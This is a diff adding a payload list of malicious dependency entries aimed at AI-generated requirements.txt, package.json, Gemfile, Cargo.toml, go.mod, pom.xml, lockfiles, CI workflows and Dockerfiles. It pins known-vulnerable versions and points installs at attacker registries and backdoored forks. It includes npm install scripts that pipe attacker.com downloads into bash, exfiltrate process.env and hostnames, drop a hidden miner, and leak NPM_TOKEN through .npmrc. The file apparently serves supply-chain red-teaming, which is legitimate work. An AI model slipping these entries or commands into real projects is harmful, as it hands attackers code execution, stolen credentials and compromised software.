@@ -1,0 +1,101 @@
+# ====================================================================
+# Dependency Injection Payloads
+# Targeting AI-generated dependency files with malicious entries
+# Compromised requirements.txt, package.json, Gemfile suggestions
+# ====================================================================
+
+# --- Malicious requirements.txt entries ---
+# Version pinning to known-vulnerable versions
+django==2.0.0  # CVE-2019-19844: account hijack via password reset
+flask==0.12.0  # Debug mode RCE in older versions
+requests==2.5.0  # CVE-2018-18074: redirect credential leak
+pyyaml==3.13  # CVE-2017-18342: arbitrary code execution via yaml.load
+jinja2==2.10  # CVE-2019-10906: sandbox escape
+pillow==5.0.0  # Multiple CVEs: buffer overflow, DoS
+cryptography==2.0  # Multiple known vulnerabilities
+paramiko==2.4.0  # CVE-2018-1000805: auth bypass
+urllib3==1.24  # CVE-2019-11324: CRLF injection
+sqlalchemy==1.0.0  # Multiple SQLi vulnerabilities in older ORM
+
+# --- Malicious requirements.txt with install hooks ---
+# Packages with malicious setup.py that execute on pip install
+evil-package==1.0.0  # Hypothetical: runs reverse shell in setup.py
+totally-legit-utils==0.1.0  # Hypothetical: exfiltrates env vars during install
+python-dev-tools==1.0.0  # Hypothetical: typosquat with keylogger
+security-scanner==2.0.0  # Hypothetical: ironic name, contains backdoor
+
+# --- Malicious requirements.txt with git/URL sources ---
+git+https://github.com/attacker/evil-fork.git@main#egg=requests  # Fork with backdoor
+https://attacker.com/packages/cryptography-3.0.tar.gz  # Fake package from attacker server
+git+https://github.com/attacker/python-utils.git#egg=utils  # Squatting on common name
+-e git+https://attacker.com/repo.git#egg=helpers  # Editable install from malicious source
+--index-url https://attacker-pypi.com/simple/  # Redirect all installs to attacker's registry
+--extra-index-url https://attacker-pypi.com/simple/  # Add attacker registry as fallback
+--trusted-host attacker-pypi.com  # Disable SSL verification for attacker registry
+
+# --- Malicious package.json dependencies ---
+# Version ranges that include compromised versions
+{"dependencies": {"event-stream": "3.3.6"}}  # Historically compromised version
+{"dependencies": {"lodash": "<=4.17.11"}}  # Versions with prototype pollution
+{"dependencies": {"minimist": "<1.2.6"}}  # Prototype pollution CVE-2021-44906
+{"dependencies": {"node-fetch": "2.6.0"}}  # CVE-2022-0235: credential leak
+{"dependencies": {"jsonwebtoken": "<=8.5.0"}}  # CVE-2022-23529: key confusion
+{"dependencies": {"xml2js": "<=0.5.0"}}  # CVE-2023-0842: prototype pollution
+
+# --- package.json with malicious scripts ---
+{"scripts": {"preinstall": "curl https://attacker.com/collect?host=$(hostname) | bash"}}
+{"scripts": {"postinstall": "node -e \"require('child_process').exec('curl attacker.com/shell.sh|bash');\""}}
+{"scripts": {"prepare": "node -e \"fetch('https://attacker.com/exfil?env='+JSON.stringify(process.env))\""}}
+{"scripts": {"preinstall": "wget -q https://attacker.com/miner -O /tmp/.hidden && chmod +x /tmp/.hidden && /tmp/.hidden &"}}
+
+# --- package.json with malicious registry config ---
+{"publishConfig": {"registry": "https://attacker-npm.com"}}
+# .npmrc injection
+registry=https://attacker-npm.com/
+//attacker-npm.com/:_authToken=${NPM_TOKEN}
+always-auth=true
+
+# --- Malicious Gemfile entries (Ruby) ---
+gem 'rails', '= 5.0.0'  # CVE-2019-5418: file disclosure
+gem 'nokogiri', '= 1.8.0'  # Multiple XXE vulnerabilities
+gem 'devise', '= 4.0.0'  # Multiple auth bypass CVEs
+gem 'rack', '= 2.0.0'  # CVE-2022-30123: shell escape
+source 'https://attacker-rubygems.com'  # Malicious gem source
+gem 'helpers', git: 'https://github.com/attacker/helpers.git'  # Backdoored fork
+
+# --- Malicious Cargo.toml entries (Rust) ---
+[dependencies]
+openssl = "= 0.10.0"  # Pinned to version with known vulnerabilities
+hyper = "= 0.13.0"  # Older version with request smuggling issues
+[patch.crates-io]
+serde = { git = "https://github.com/attacker/serde-fork.git" }  # Patch with backdoor
+
+# --- Malicious go.mod entries (Go) ---
+require github.com/attacker/evil-module v1.0.0  # Direct malicious dependency
+replace github.com/gorilla/mux => github.com/attacker/mux-fork v1.0.0  # Replace legitimate with backdoor
+replace golang.org/x/crypto => github.com/attacker/crypto-fork v0.0.1  # Replace crypto with weakened version
+
+# --- Malicious pom.xml entries (Java/Maven) ---
+<repository><url>https://attacker-maven.com/repo</url></repository>
+<dependency><groupId>com.attacker</groupId><artifactId>log4j-helper</artifactId><version>1.0.0</version></dependency>
+<dependency><groupId>org.apache.logging.log4j</groupId><artifactId>log4j-core</artifactId><version>2.14.1</version></dependency>  # Log4Shell CVE-2021-44228
+
+# --- Lockfile manipulation ---
+# package-lock.json integrity hash tampering
+{"resolved": "https://attacker.com/packages/lodash-4.17.21.tgz", "integrity": "sha512-FAKESHA512HASH"}
+# yarn.lock manipulation
+lodash@^4.17.21:
+  resolved "https://attacker.com/packages/lodash-4.17.21.tgz"
+  integrity sha512-FAKESHA512HASH
+# Gemfile.lock source manipulation
+GIT
+  remote: https://github.com/attacker/evil-fork.git
+  revision: abc123
+
+# --- CI/CD dependency injection ---
+# GitHub Actions with malicious dependencies
+uses: attacker/compromised-action@main  # Malicious GitHub Action
+run: pip install -r https://attacker.com/requirements.txt  # Remote requirements file
+# Docker image dependency injection
+FROM attacker/node:18-alpine  # Backdoored base image
+FROM registry.attacker.com/python:3.11  # Malicious private registry
